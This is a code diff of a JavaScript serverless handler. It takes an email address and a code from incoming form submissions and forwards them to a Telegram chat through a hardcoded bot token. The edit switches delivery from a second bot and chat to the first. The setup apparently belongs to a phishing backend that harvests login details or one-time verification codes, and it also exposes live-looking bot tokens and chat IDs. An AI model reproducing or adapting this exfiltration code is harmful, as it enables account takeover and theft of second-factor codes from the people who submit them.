@@ -4,9 +4,7 @@ module.exports = async function handler(req, res) {
   }
 
   const token = '7980617142:AAFzl-zy6O9W1cOIauK9ksDI8Zm7beQ3AsE';
-  const token2 = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
   const chatId = '-5263210542';
-  const chatId2 = '-5050388811';
 
   try {
     const { email, code } = req.body;
@@ -19,12 +17,12 @@ module.exports = async function handler(req, res) {
     `;
 
     const tgRes = await fetch(
-      `https://api.telegram.org/bot${token2}/sendMessage`,
+      `https://api.telegram.org/bot${token}/sendMessage`,
       {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: chatId2,
+          chat_id: chatId,
           text: message
         })
       }
